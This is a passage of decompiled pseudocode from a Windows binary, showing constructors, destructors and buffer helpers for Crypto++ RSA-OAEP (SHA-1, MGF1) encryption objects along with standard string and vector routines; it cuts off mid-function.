_DWORD *__fastcall sub_408B76(_DWORD *a1, int a2, int a3)
{
  _DWORD *result; // eax

  sub_408B9C((int)a1, a2, a3);
  *a1 = &off_46E07C;
  result = a1;
  a1[1] = &off_46E0BC;
  return result;
}
// 46E07C: using guessed type int (__thiscall *off_46E07C)(void *Block, char);
// 46E0BC: using guessed type void *off_46E0BC;

//----- (00408B9C) --------------------------------------------------------
int __fastcall sub_408B9C(int a1, int a2, int a3)
{
  *(_BYTE *)(a1 + 8) = *(_BYTE *)(a3 + 8);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a3 + 12);
  sub_409293(a1 + 16, a2, (_DWORD *)(a3 + 16));
  sub_409247((_DWORD *)(a1 + 288), a3 + 288);
  return a1;
}

//----- (00408BF1) --------------------------------------------------------
_DWORD *__thiscall sub_408BF1(_DWORD *this)
{
  _DWORD *result; // eax

  sub_408C19(this);
  *this = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
  result = this;
  this[1] = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
  this[2] = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
  return result;
}
// 46CF6C: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 46CF98: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 46CFB8: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';

//----- (00408C19) --------------------------------------------------------
_DWORD *__thiscall sub_408C19(_DWORD *this)
{
  sub_40CAC3(this + 1, 1);
  sub_408C3C(this + 3, 1);
  return this;
}

//----- (00408C3C) --------------------------------------------------------
_DWORD *__thiscall sub_408C3C(_DWORD *this, int a2)
{
  int v3; // eax
  int v4; // eax

  if ( a2 )
  {
    this[2] = &unk_47ECB8;
    this[15] = &CryptoPP::NameValuePairs::`vftable';
  }
  v3 = this[2];
  this[1] = &CryptoPP::X509PublicKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v3 + 4) + 8) = &CryptoPP::X509PublicKey::`vftable';
  v4 = this[2];
  *this = &CryptoPP::RSAFunction::`vftable';
  this[1] = &CryptoPP::RSAFunction::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v4 + 4) + 8) = &CryptoPP::RSAFunction::`vftable';
  sub_40E940(this + 3);
  sub_40E940(this + 9);
  return this;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 46CE98: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 46CEC0: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 46CEF0: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 46CF14: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 46CF3C: using guessed type void *CryptoPP::RSAFunction::`vftable';

//----- (00408CC4) --------------------------------------------------------
_DWORD *__thiscall sub_408CC4(_DWORD *this, int a2)
{
  this[1] = *(_DWORD *)(a2 + 4);
  this[2] = *(_DWORD *)(a2 + 8);
  sub_409184((int)(this + 4), a2 + 16);
  return this;
}

//----- (00408CF9) --------------------------------------------------------
_DWORD *__thiscall sub_408CF9(_DWORD *this, int a2)
{
  sub_408CC4(this, a2);
  sub_409184((int)(this + 26), a2 + 104);
  return this;
}

//----- (00408D1D) --------------------------------------------------------
std::exception *__thiscall sub_408D1D(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';
  return this;
}
// 46E5E4: using guessed type void *CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';

//----- (00408D3C) --------------------------------------------------------
_DWORD *__thiscall sub_408D3C(_DWORD *Block, char a2)
{
  *Block = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  Block[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46E1B8: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';
// 46E26C: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';

//----- (00408D66) --------------------------------------------------------
std::exception *__thiscall sub_408D66(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::CannotFlush::`vftable';
  return this;
}
// 46C44C: using guessed type void *CryptoPP::CannotFlush::`vftable';

//----- (00408D85) --------------------------------------------------------
_DWORD *__thiscall sub_408D85(_DWORD *this, int a2)
{
  sub_406BFD(this, a2);
  *this = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';
  sub_408DC8(this + 4, a2 + 16);
  return this;
}
// 46C644: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';

//----- (00408DC8) --------------------------------------------------------
_DWORD *__thiscall sub_408DC8(_DWORD *this, int a2)
{
  *(_BYTE *)this = *(_BYTE *)a2;
  this[1] = *(_DWORD *)(a2 + 4);
  this[2] = *(_DWORD *)(a2 + 8);
  sub_409247(this + 3, a2 + 12);
  return this;
}

//----- (00408DF8) --------------------------------------------------------
_DWORD *__thiscall sub_408DF8(_DWORD *this, int a2)
{
  *(_BYTE *)this = *(_BYTE *)a2;
  this[1] = *(_DWORD *)(a2 + 4);
  this[2] = *(_DWORD *)(a2 + 8);
  sub_40954A(this + 3, a2 + 12);
  return this;
}

//----- (00408E24) --------------------------------------------------------
_DWORD *__thiscall sub_408E24(_DWORD *this, int a2)
{
  sub_406BFD(this, a2);
  *this = &CryptoPP::AlgorithmParametersTemplate<int>::`vftable';
  this[4] = *(_DWORD *)(a2 + 16);
  return this;
}
// 46C634: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable';

//----- (00408E4C) --------------------------------------------------------
std::exception *__thiscall sub_408E4C(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
  return this;
}
// 46B49C: using guessed type void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';

//----- (00408E6B) --------------------------------------------------------
void *__thiscall sub_408E6B(void *Block, char a2)
{
  sub_407F9E((int)Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00408E90) --------------------------------------------------------
_DWORD *__thiscall sub_408E90(_DWORD *Block, char a2)
{
  sub_408EE7(Block + 3);
  Block[18] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00408EBE) --------------------------------------------------------
_DWORD *__thiscall sub_408EBE(_DWORD *Block, char a2)
{
  sub_408EE7(Block);
  Block[15] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00408EE7) --------------------------------------------------------
int __thiscall sub_408EE7(_DWORD *this)
{
  int v2; // eax
  int result; // eax

  sub_40891D((int)(this + 10));
  sub_40891D((int)(this + 4));
  v2 = this[2];
  this[1] = &CryptoPP::X509PublicKey::`vftable';
  result = *(_DWORD *)(v2 + 4);
  *(_DWORD *)((char *)this + result + 8) = &CryptoPP::X509PublicKey::`vftable';
  return result;
}
// 46CE98: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 46CEC0: using guessed type void *CryptoPP::X509PublicKey::`vftable';

//----- (00408F2E) --------------------------------------------------------
void *__thiscall sub_408F2E(void *Block, char a2)
{
  sub_409166((int)Block + 104);
  sub_409166((int)Block + 16);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00408F5E) --------------------------------------------------------
void **__thiscall sub_408F5E(void **Block, char a2)
{
  sub_406E8A((int)(Block + 4));
  sub_406B9E(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00408F8A) --------------------------------------------------------
void **__thiscall sub_408F8A(void **Block, char a2)
{
  sub_406B9E(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00408FAC) --------------------------------------------------------
_DWORD *__thiscall sub_408FAC(_DWORD *this)
{
  _DWORD *result; // eax
  _DWORD Src[10]; // [esp+8h] [ebp-28h] BYREF

  Src[5] = 15;
  Src[6] = this;
  Src[4] = 0;
  LOBYTE(Src[0]) = 0;
  unknown_libname_15("BufferedTransformation: this object doesn't allow input");
  Src[9] = 0;
  sub_406307(this, 0, Src);
  *this = &CryptoPP::NotImplemented::`vftable';
  unknown_libname_5(Src);
  result = this;
  *this = &CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';
  return result;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 46B49C: using guessed type void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable';

//----- (0040900F) --------------------------------------------------------
_DWORD *__thiscall sub_40900F(_DWORD *this)
{
  _DWORD *result; // eax
  _DWORD Src[10]; // [esp+8h] [ebp-28h] BYREF

  Src[5] = 15;
  Src[6] = this;
  Src[4] = 0;
  LOBYTE(Src[0]) = 0;
  unknown_libname_15("BufferedTransformation: this object doesn't allow input");
  Src[9] = 0;
  sub_406307(this, 0, Src);
  *this = &CryptoPP::NotImplemented::`vftable';
  unknown_libname_5(Src);
  result = this;
  *this = &CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';
  return result;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 46E5E4: using guessed type void *CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable';

//----- (00409072) --------------------------------------------------------
int __cdecl sub_409072(int a1)
{
  void *v1; // esi
  int v2; // eax
  char v4[24]; // [esp+8h] [ebp-54h] BYREF
  char v5[24]; // [esp+20h] [ebp-3Ch] BYREF
  char v6[16]; // [esp+38h] [ebp-24h] BYREF
  int v7; // [esp+48h] [ebp-14h]
  int v8; // [esp+4Ch] [ebp-10h]
  int v9; // [esp+58h] [ebp-4h]

  v1 = (void *)sub_40948A((int)v4);
  v9 = 0;
  v7 = 0;
  v8 = 15;
  v6[0] = 0;
  unknown_libname_15("RSA");
  LOBYTE(v9) = 1;
  v2 = unknown_libname_13("/");
  std::string::string(v2);
  LOBYTE(v9) = 2;
  sub_409630(a1, v5, v1);
  unknown_libname_5(v5);
  unknown_libname_5(v6);
  unknown_libname_5(v4);
  return a1;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);
// 409072: using guessed type char var_24[16];

//----- (00409102) --------------------------------------------------------
_DWORD *__thiscall sub_409102(_DWORD *this)
{
  _DWORD *result; // eax

  sub_409419(this);
  *this = &off_46E07C;
  result = this;
  this[1] = &off_46E0BC;
  return result;
}
// 46E07C: using guessed type int (__thiscall *off_46E07C)(void *Block, char);
// 46E0BC: using guessed type void *off_46E0BC;

//----- (00409123) --------------------------------------------------------
int __thiscall sub_409123(int this)
{
  sub_409462((_DWORD *)this);
  sub_4095B1(this + 104, 0x10u);
  sub_420F4A(*(_DWORD **)(this + 184));
  return this;
}

//----- (00409166) --------------------------------------------------------
int __thiscall sub_409166(int this)
{
  unsigned int v1; // edx
  void *v2; // edi
  int result; // eax

  v1 = *(_DWORD *)(this + 76);
  if ( *(_DWORD *)(this + 72) < v1 )
    v1 = *(_DWORD *)(this + 72);
  v2 = *(void **)(this + 80);
  if ( v2 == (void *)this )
  {
    *(_BYTE *)(this + 65) = 0;
    result = 0;
    memset(v2, 0, 4 * v1);
  }
  return result;
}

//----- (00409184) --------------------------------------------------------
int __thiscall sub_409184(int this, int a2)
{
  void *v3; // ebx
  int v4; // edx

  v3 = 0;
  *(_BYTE *)(this + 65) = 0;
  *(_DWORD *)(this + 72) = *(_DWORD *)(a2 + 72);
  v4 = *(_DWORD *)(a2 + 76);
  *(_DWORD *)(this + 76) = v4;
  if ( *(_DWORD *)(a2 + 76) <= 0x10u )
  {
    *(_BYTE *)(this + 65) = 1;
    v3 = (void *)this;
  }
  *(_DWORD *)(this + 80) = v3;
  if ( *(_DWORD *)(a2 + 80) )
    sub_40622B(v3, 4 * v4, *(void **)(a2 + 80), 4 * *(_DWORD *)(a2 + 76));
  return this;
}

//----- (004091D2) --------------------------------------------------------
unsigned int __thiscall sub_4091D2(_DWORD *this)
{
  int v1; // eax
  int *v2; // eax
  unsigned int v3; // esi
  unsigned int v4; // eax
  char v6[4]; // [esp+4h] [ebp-24h] BYREF
  char v7[20]; // [esp+8h] [ebp-20h] BYREF
  int v8; // [esp+24h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (int *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 4))(v1, v6);
  v3 = 0;
  v8 = 0;
  v4 = sub_410F9E(v2);
  if ( v4 > 1 )
    v3 = v4 - 1;
  sub_40891D((int)v7);
  return v3;
}
// 4091D2: using guessed type char var_24[4];
// 4091D2: using guessed type char var_20[20];

//----- (0040921E) --------------------------------------------------------
void __stdcall sub_40921E(void *Block, int a2)
{
  memset(Block, 0, a2);
  if ( a2 )
    j_j_unknown_libname_57(Block);
  else
    j_j___free_base(Block);
}
// 420BA7: using guessed type _DWORD __cdecl j_j_unknown_libname_57(_DWORD);

//----- (00409247) --------------------------------------------------------
_DWORD *__thiscall sub_409247(_DWORD *this, int a2)
{
  void *v3; // eax

  this[1] = *(_DWORD *)(a2 + 4);
  this[2] = *(_DWORD *)(a2 + 8);
  if ( *(_DWORD *)(a2 + 8) )
    v3 = sub_420BF0(*(_DWORD *)(a2 + 8));
  else
    v3 = 0;
  this[3] = v3;
  if ( *(_DWORD *)(a2 + 12) )
    sub_40622B(v3, this[2], *(void **)(a2 + 12), *(_DWORD *)(a2 + 8));
  return this;
}

//----- (00409293) --------------------------------------------------------
int __fastcall sub_409293(int a1, int a2, _DWORD *a3)
{
  void *v4; // eax
  void *v5; // edx

  *(_BYTE *)(a1 + 249) = 0;
  *(_DWORD *)(a1 + 256) = a3[64];
  *(_DWORD *)(a1 + 260) = a3[65];
  v4 = (void *)sub_409587(a1, a2, a3[65], 0);
  *(_DWORD *)(a1 + 264) = v4;
  v5 = (void *)a3[66];
  if ( v5 )
    sub_40622B(v4, 4 * *(_DWORD *)(a1 + 260), v5, 4 * a3[65]);
  return a1;
}

//----- (004092FE) --------------------------------------------------------
void *__fastcall sub_4092FE(int a1, int a2, void *a3, int a4)
{
  void *result; // eax

  result = (void *)(a1 + (-a1 & 0xF));
  if ( a3 == result )
  {
    *(_BYTE *)(a1 + 249) = 0;
    result = 0;
    memset(a3, 0, 4 * a4);
  }
  return result;
}

//----- (00409325) --------------------------------------------------------
int __cdecl sub_409325(unsigned int a1)
{
  int result; // eax

  result = 16;
  if ( a1 > 0x10 )
  {
    result = 32;
    if ( a1 < 0x20 )
      return a1 - (((_BYTE)a1 - 1) & 7) + 7;
  }
  return result;
}

//----- (00409348) --------------------------------------------------------
void __stdcall sub_409348(void *Block, int a2)
{
  memset(Block, 0, 4 * a2);
  if ( a2 )
    j_j_unknown_libname_57(Block);
  else
    j_j___free_base(Block);
}
// 420BA7: using guessed type _DWORD __cdecl j_j_unknown_libname_57(_DWORD);

//----- (00409370) --------------------------------------------------------
int __thiscall sub_409370(int *this, int a2)
{
  int v3; // edi
  int v4; // esi

  v3 = (this[1] - *this) / 24;
  v4 = sub_40276C(0x1388u);
  sub_40271B(*this, this[1], v4);
  return sub_40268D(this, v4, v3, 5000);
}

//----- (004093D7) --------------------------------------------------------
void **__thiscall sub_4093D7(_DWORD *this, unsigned int a2)
{
  void **result; // eax
  unsigned int v4; // edi

  result = (void **)a2;
  v4 = this[4];
  if ( v4 <= a2 && this[5] != a2 )
  {
    if ( this[5] >= a2 )
    {
      if ( a2 < 0x10 && this[5] >= 0x10u )
        return (void **)unknown_libname_19(this);
    }
    else
    {
      LOBYTE(a2) = 0;
      result = sub_409A35((void **)this, (unsigned int)result - v4, a2);
      this[4] = v4;
    }
  }
  return result;
}

//----- (00409419) --------------------------------------------------------
_DWORD *__thiscall sub_409419(_DWORD *this)
{
  int v2; // edx
  _DWORD *result; // eax

  sub_40CAC3(this + 1, 1);
  sub_4095DA((int)(this + 4), v2, 0x3Cu);
  this[73] = -1;
  result = this;
  this[74] = 0;
  this[75] = 0;
  return result;
}
// 409439: variable 'v2' is possibly undefined

//----- (00409462) --------------------------------------------------------
_DWORD *__thiscall sub_409462(_DWORD *this)
{
  sub_40CAC3(this, 1);
  this[1] = 0;
  this[2] = 0;
  sub_4095B1((int)(this + 4), 0x10u);
  return this;
}

//----- (0040948A) --------------------------------------------------------
int __cdecl sub_40948A(int a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  char v6[24]; // [esp+0h] [ebp-6Ch] BYREF
  char v7[24]; // [esp+18h] [ebp-54h] BYREF
  char v8[24]; // [esp+30h] [ebp-3Ch] BYREF
  char v9[16]; // [esp+48h] [ebp-24h] BYREF
  int v10; // [esp+58h] [ebp-14h]
  int v11; // [esp+5Ch] [ebp-10h]
  int v12; // [esp+68h] [ebp-4h]

  v10 = 0;
  v11 = 15;
  v9[0] = 0;
  unknown_libname_15("OAEP-");
  v12 = 3;
  v1 = unknown_libname_13("MGF1");
  std::string::string(v1);
  v2 = unknown_libname_13("(");
  std::string::string(v2);
  v3 = unknown_libname_13("SHA-1");
  std::string::string(v3);
  v4 = unknown_libname_13(")");
  std::string::string(v4);
  unknown_libname_5(v8);
  unknown_libname_5(v7);
  unknown_libname_5(v6);
  unknown_libname_5(v9);
  return a1;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);
// 40948A: using guessed type char var_24[16];
// 40948A: using guessed type char var_6C[24];
// 40948A: using guessed type char var_54[24];
// 40948A: using guessed type char var_3C[24];

//----- (0040954A) --------------------------------------------------------
void *__thiscall sub_40954A(_DWORD *this, int a2)
{
  void *result; // eax
  void *v4; // ecx

  if ( this != (_DWORD *)a2 )
  {
    result = sub_40898B((int)this, *(_DWORD *)(a2 + 8));
    v4 = (void *)this[3];
    if ( v4 )
    {
      if ( *(_DWORD *)(a2 + 12) )
        result = (void *)sub_40622B(v4, this[2], *(void **)(a2 + 12), *(_DWORD *)(a2 + 8));
    }
  }
  this[1] = -1;
  return result;
}

//----- (00409587) --------------------------------------------------------
int __fastcall sub_409587(int a1, int a2, unsigned int a3, int a4)
{
  if ( a3 > 0x3C || *(_BYTE *)(a1 + 249) )
    return 0;
  *(_BYTE *)(a1 + 249) = 1;
  return a1 + (-a1 & 0xF);
}

//----- (004095B1) --------------------------------------------------------
int __thiscall sub_4095B1(int this, unsigned int a2)
{
  int v2; // edx

  v2 = 0;
  *(_BYTE *)(this + 65) = 0;
  *(_DWORD *)(this + 72) = 0x3FFFFFFF;
  *(_DWORD *)(this + 76) = a2;
  if ( a2 <= 0x10 )
  {
    *(_BYTE *)(this + 65) = 1;
    v2 = this;
  }
  *(_DWORD *)(this + 80) = v2;
  return this;
}

//----- (004095DA) --------------------------------------------------------
int __fastcall sub_4095DA(int a1, int a2, unsigned int a3)
{
  *(_BYTE *)(a1 + 249) = 0;
  *(_DWORD *)(a1 + 256) = 0x3FFFFFFF;
  *(_DWORD *)(a1 + 260) = a3;
  *(_DWORD *)(a1 + 264) = sub_409587(a1, a2, a3, 0);
  return a1;
}

//----- (0040960F) --------------------------------------------------------
int __cdecl sub_40960F(void *a1)
{
  int v1; // ecx
  int v2; // esi
  int v3; // eax

  v2 = v1;
  v3 = unknown_libname_13(a1);
  std::string::string(v3);
  return v2;
}
// 409617: variable 'v1' is possibly undefined
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);

//----- (00409630) --------------------------------------------------------
int __cdecl sub_409630(int a1, char *Src, void *a3)
{
  char *v3; // ecx
  unsigned int v4; // esi
  void **v5; // eax

  v3 = Src;
  v4 = *((_DWORD *)Src + 4);
  if ( *((_DWORD *)a3 + 4) <= *((_DWORD *)Src + 5) - v4 || *((_DWORD *)a3 + 5) - *((_DWORD *)a3 + 4) < v4 )
  {
    v5 = (void **)std::string::append(a3);
  }
  else
  {
    if ( *((_DWORD *)Src + 5) >= 0x10u )
      v3 = *(char **)Src;
    v5 = sub_409AC0((int)a3, (int)v3, v3, *((_DWORD *)Src + 4));
  }
  std::string::string(v5);
  return a1;
}
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);

//----- (0040967A) --------------------------------------------------------
int __thiscall sub_40967A(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  v1 = (int (__thiscall ***)(_DWORD, int))*this;
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}

//----- (004096AA) --------------------------------------------------------
int __thiscall sub_4096AA(_DWORD *this, int a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int result; // eax

  v3 = (void (__thiscall ***)(_DWORD, int))*this;
  if ( v3 )
    (**v3)(v3, 1);
  result = a2;
  *this = a2;
  return result;
}

//----- (004096C6) --------------------------------------------------------
char *__cdecl sub_4096C6(char *a1, int a2, int a3, char a4)
{
  _DWORD *v4; // eax
  int v5; // eax
  int v7; // [esp+0h] [ebp-18h] BYREF
  _DWORD v8[5]; // [esp+4h] [ebp-14h] BYREF

  v4 = sub_41ECA2(&v7);
  v8[4] = 0;
  v5 = sub_409B59((int)v4, a2, a3, a4);
  sub_41EC5D(a1, v5);
  sub_40967A(v8);
  return a1;
}

//----- (0040970F) --------------------------------------------------------
char *__cdecl sub_40970F(char *a1, int a2, _DWORD *a3, char a4)
{
  _DWORD *v4; // eax
  int v5; // eax
  int v7; // [esp+0h] [ebp-18h] BYREF
  _DWORD v8[5]; // [esp+4h] [ebp-14h] BYREF

  v4 = sub_41ECA2(&v7);
  v8[4] = 0;
  v5 = sub_409C38((int)v4, a2, a3, a4);
  sub_41EC5D(a1, v5);
  sub_40967A(v8);
  return a1;
}

//----- (00409758) --------------------------------------------------------
int __thiscall sub_409758(int *this, int a2, int a3)
{
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  int v7; // edx
  int v8; // et2
  int v10; // edi
  int v12; // [esp+Ch] [ebp-Ch]
  unsigned int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]
  int v15; // [esp+20h] [ebp+8h]

  v4 = *this;
  v5 = this[1] - v4;
  v14 = v4;
  v8 = v5 % 24;
  v6 = v5 / 24;
  v7 = v8;
  if ( v6 == 178956970 )
    sub_402682(24, v7);
  v12 = v6 + 1;
  v13 = sub_4026F0(this, v6 + 1);
  v10 = sub_40276C(v13);
  v15 = v10 + 24 * ((a2 - v14) / 24);
  std::wstring::wstring(a3);
  if ( a2 == this[1] )
  {
    sub_40271B(*this, this[1], v10);
  }
  else
  {
    sub_402744(*this, a2, v10);
    sub_402744(a2, this[1], v15 + 24);
  }
  sub_40268D(this, v10, v12, v13);
  return v15;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (004097F9) --------------------------------------------------------
int __fastcall sub_4097F9(int a1, _DWORD *a2, _DWORD *a3)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 7;
  *(_WORD *)a1 = 0;
  sub_405FAE((void **)a1, a3[4] + a2[4]);
  std::wstring::append(a2);
  std::wstring::append(a3);
  return a1;
}

//----- (0040985F) --------------------------------------------------------
int sub_40985F()
{
  int result; // eax
  int v1; // eax
  _DWORD *v2; // esi
  int v3; // eax

  if ( dword_493198 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_493198);
    if ( dword_493198 == -1 )
    {
      _Mtx_init_in_situ((_Mtx_t)&unk_49319C, 2);
      atexit(sub_469EBB);
      _Init_thread_footer(&dword_493198);
    }
  }
  result = dword_493194;
  if ( !dword_493194 )
  {
    v1 = _Mtx_lock((_Mtx_t)&unk_49319C);
    std::_Check_C_return(v1);
    v2 = (_DWORD *)dword_493194;
    if ( !dword_493194 )
    {
      v2 = operator new(4u);
      *v2 = &CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>::`vftable';
      dword_493194 = (int)v2;
    }
    v3 = _Mtx_unlock((_Mtx_t)&unk_49319C);
    std::_Check_C_return(v3);
    return (int)v2;
  }
  return result;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46CE74: using guessed type void *CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>::`vftable';
// 493194: using guessed type int dword_493194;
// 493198: using guessed type int dword_493198;

//----- (00409919) --------------------------------------------------------
char *__fastcall sub_409919(_DWORD *a1, int a2, char *Src, char *a4)
{
  _BYTE *v5; // ebx
  int v6; // eax
  char *v7; // edi
  char *v8; // eax
  char *v10; // ecx
  char *v11; // ebx
  char *v13; // [esp-14h] [ebp-28h]
  size_t v14; // [esp-10h] [ebp-24h]
  int v15; // [esp+Ch] [ebp-8h]
  unsigned int v16; // [esp+10h] [ebp-4h]
  char *Srca; // [esp+1Ch] [ebp+8h]

  v5 = (_BYTE *)*a1;
  v6 = a1[1] - *a1;
  if ( v6 == 0x7FFFFFFF )
    sub_402682(a1, a2);
  v15 = v6 + 1;
  v16 = sub_40292E(a1, v6 + 1);
  v7 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v16);
  v8 = (char *)(v7 - v5);
  Srca = &v8[(_DWORD)Src];
  *Srca = *a4;
  v10 = (char *)a1[1];
  if ( Src == v10 )
  {
    memmove(v7, (const void *)*a1, (size_t)&v10[-*a1]);
    v11 = Srca;
  }
  else
  {
    memmove(v7, (const void *)*a1, (size_t)&Src[-*a1]);
    v14 = a1[1] - (_DWORD)Src;
    v13 = Src;
    v11 = Srca;
    memmove(Srca + 1, v13, v14);
  }
  sub_4028FA((int)a1, (int)v7, v15, v16);
  return v11;
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (004099B2) --------------------------------------------------------
void *__cdecl sub_4099B2(int a1, void *Block, unsigned int a3, size_t Size, char a5)
{
  void *v7; // eax
  size_t v8; // edx
  int v9; // [esp+1Ch] [ebp+10h]

  if ( a3 == Size )
    return Block;
  if ( a5 )
  {
    if ( Size )
      v7 = sub_420BF0(Size);
    else
      v7 = 0;
    v9 = (int)v7;
    v8 = a3;
    if ( Size < a3 )
      v8 = Size;
    if ( Block )
    {
      if ( v7 )
        sub_40622B(v7, v8, Block, v8);
    }
    memset(Block, 0, a3);
    j_j___free_base(Block);
    return (void *)v9;
  }
  else
  {
    memset(Block, 0, a3);
    j_j___free_base(Block);
    if ( Size )
      return sub_420BF0(Size);
    else
      return 0;
  }
}

//----- (00409A35) --------------------------------------------------------
void **__thiscall sub_409A35(void **Src, unsigned int a2, int a3)
{
  char *v4; // ecx
  char *v5; // edi
  unsigned int v6; // esi
  void *v7; // eax
  void *v8; // esi
  int v10; // [esp-Ch] [ebp-20h]
  size_t v11; // [esp-4h] [ebp-18h]
  void *v12; // [esp+Ch] [ebp-8h]
  char *v13; // [esp+10h] [ebp-4h]
  unsigned int v14; // [esp+1Ch] [ebp+8h]

  v4 = (char *)Src[4];
  v13 = v4;
  if ( 0x7FFFFFFF - (int)v4 < a2 )
    sub_40278D();
  v5 = &v4[a2];
  v10 = (int)&v4[a2];
  v14 = (unsigned int)Src[5];
